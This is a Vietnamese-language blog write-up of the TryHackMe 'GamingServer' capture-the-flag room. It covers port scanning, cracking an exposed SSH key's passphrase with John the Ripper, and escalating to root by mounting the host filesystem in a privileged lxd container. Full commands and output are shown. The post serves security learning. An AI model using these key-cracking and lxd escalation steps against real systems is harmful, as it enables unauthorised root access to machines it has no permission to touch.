---
layout: post
author: "Neo"
title: "Tryhackme - GamingServer"
date: "2021-11-17"
tags: [
  "tryhackme",
  "web",
  "linux",
  "ssh",
  "lxd",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-11-17-THM-GamingServer/1.webp)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - GamingServer](https://tryhackme.com/room/gamingserver)

## Reconnaissance

Vẫn như thông thường, việc đầu tiên là quét cổng.

```py
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Chỉ có 2 port nên tôi sẽ bắt đầu với web server. Có vẻ đây là trang web của 1 tựa game, tôi thử check qua các path đơn giản thì tôi tìm được */robots.txt* và bên trong đó là */uploads*. 

![uploads](/assets/img/2021-11-17-THM-GamingServer/2.webp)

Tôi có 1 file dict là 1 list các từ thì có thể sẽ được dùng làm wordlist để bruteforce, 1 file txt và 1 bức ảnh. Cũng không có gì đặc biệt ở đây. Thử dùng [dirsearch](https://github.com/maurosoria/dirsearch) để check xem còn path nào nữa không, tôi tìm được */secret/*. Trong này có 1 file rsa key. Tôi có thể dùng key này để login ssh chăng. Nhưng hiện tại tôi chưa có username nào. 

Loanh quanh web 1 lúc thì tôi đã tìm được 1 cái tên trong source web. 

`<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->`

Tuy nhiên, khi thử login ssh tôi được yêu cầu phải có passphrase. Vì vậy tôi sẽ dùng __John-the-Ripper__ để crack passphrase từ key trên.

## SSH

```py
┌──(neo㉿kali)-[~]
└─$ ssh2john key > id_rsa.hash                                                                   
┌──(neo㉿kali)-[~]
└─$ john --wordlist=dict.lst id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******          (key)     
1g 0:00:00:00 DONE (2022-08-04 22:54) 5.000g/s 1115p/s 1115c/s 1115C/s 2003
```

Login ssh và tôi có __user flag__

```py
john@exploitable:~$ ls
user.txt
```

## Privilege escalation

```py
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Tôi để ý user John nằm trong group `lxd`, đây cũng là 1 exploit khá hay nhưng trước hết tôi sẽ thử các exploit phổ biến trước, nếu không thể thì tôi sẽ quay lại `lxd`. Tuy nhiên sau 1 lúc loay hoay với `sudo -l` hay tìm SUID đều không có kết quả, tôi sẽ quay lại `lxd`. 

`lxd` về bản chất thì tương tự như Docker tuy nhiên nó có thể chứa được cả hệ điều hành trong 1 container. Và với `lxd` tôi sẽ làm theo hướng dẫn ở [đây](https://www.hackingarticles.in/lxd-privilege-escalation/)

Đầu tiên tải build-alpine:

```py
┌──(neo㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2022-08-05 03:03:48--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8060 (7.9K) [text/plain]
Saving to: ‘build-alpine’

build-alpine                                    100%[====================================================================================================>]   7.87K  --.-KB/s    in 0.001s  

2022-08-05 03:03:48 (6.13 MB/s) - ‘build-alpine’ saved [8060/8060]
```

Sau đó build container:

```py
┌──(root㉿kali)-[/home/neo]
└─# ./build-alpine 
Determining the latest release... v3.16
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64
Downloading apk-tools-static-2.12.9-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.4-r1.apk
...
```

Sau khi build xong thì tôi sẽ có được 1 container như thế này:

```py
┌──(root㉿kali)-[/home/neo]
└─# ll
total 4228
-rw-r--r-- 1 root root 3203668 Aug  5 03:07 alpine-v3.16-x86_64-20220805_0307.tar.gz
```

Việc tiếp theo là tạo http server bằng python để upload nó lên remote machine:

```py
john@exploitable:~$ wget http://10.18.3.74:9000/alpine-v3.16-x86_64-20220805_0307.tar.gz
--2022-08-05 07:10:52--  http://10.18.3.74:9000/alpine-v3.16-x86_64-20220805_0307.tar.gz
Connecting to 10.18.3.74:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3203668 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.16-x86_64-20220805_0307.tar.gz’

alpine-v3.16-x86_64-20220805_0307.tar.gz        100%[====================================================================================================>]   3.05M   614KB/s    in 5.5s    

2022-08-05 07:10:58 (571 KB/s) - ‘alpine-v3.16-x86_64-20220805_0307.tar.gz’ saved [3203668/3203668]
```

Sau đó thì thêm image vào lxd và thử kiểm tra xem lxd đã nhận image chưa:

```py
john@exploitable:/var/tmp$ lxc image import alpine-v3.16-x86_64-20220805_0307.tar.gz --alias myimage
Image imported with fingerprint: 963724185ee69c3baf96c05771e0e4e0fdcbb4b75bed127ab48877a7533ac0b6
john@exploitable:/var/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 963724185ee6 | no     | alpine v3.16 (20220805_03:07) | x86_64 | 3.06MB | Aug 5, 2022 at 7:45am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
```

Sau đó làm theo các câu lệnh như exploit bên trên:

```py
john@exploitable:/var/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/var/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/var/tmp$ lxc start ignite
john@exploitable:/var/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
```

## Tổng kết

Qua bài này, tôi biết thêm về `lxd` container và cách leo thang đặc quyền với nó. Và nó cũng rất hữu ích để tạo container cho cả hệ điều hành và tôi có thể đẩy nó lên bất cứ đâu mà không phải cài lại cả hệ điều hành.



